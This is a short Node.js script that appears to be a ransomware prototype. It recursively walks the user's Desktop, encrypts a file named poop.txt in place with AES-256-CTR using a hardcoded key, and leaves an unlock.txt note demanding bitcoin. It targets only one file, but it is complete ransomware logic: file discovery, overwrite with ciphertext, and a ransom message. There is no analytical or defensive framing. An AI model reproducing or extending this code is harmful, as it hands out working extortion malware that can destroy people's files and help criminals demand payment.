//the code below works if it finds a file named poop on the desktop

const fs = require('fs');
const { resolve } = require('path');
const homedir = require('os').homedir();
const crypto = require('crypto');
const { prototype } = require('events');
const { readdir } = require('fs').promises;
const ENC_KEY = Buffer.from("bf3c199c2470cb477d907b1e0917c17bbf3c199c2470cb477d907b1e0917c17b", "hex");
const IV = Buffer.from("5183666c72eec9e45183666c72eec9e4", "hex");

async function* getFiles(dir) {
    const dirEntries = await readdir(dir, { withFileTypes: true });
    for (const dirEntry of dirEntries) {
      const res = resolve(dir, dirEntry.name);
      if (dirEntry.isDirectory()) {
        yield* getFiles(res);
      } else {
        yield res;
      }
    }
    }
const encrypt = ((val) => {
    let cipher = crypto.createCipheriv('aes-256-ctr', ENC_KEY, IV);
    let encrypted = cipher.update(val, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    if(encrypted){
      return encrypted
    }else{throw 'not work'}
    });
    
 ;(async () => {
    for await (const f of getFiles(`${homedir}\\Desktop`)) {
      if(f === `${homedir}\\Desktop\\poop.txt`){
          console.log('working')
            const data = fs.readFileSync(f, 'utf8')
            fs.writeFileSync(f, encrypt(data))
            fs.writeFileSync(`${homedir}/Desktop/unlock.txt`, 'To unlock your files you`ll need to send bitoin to this address')
      }
      
    }})()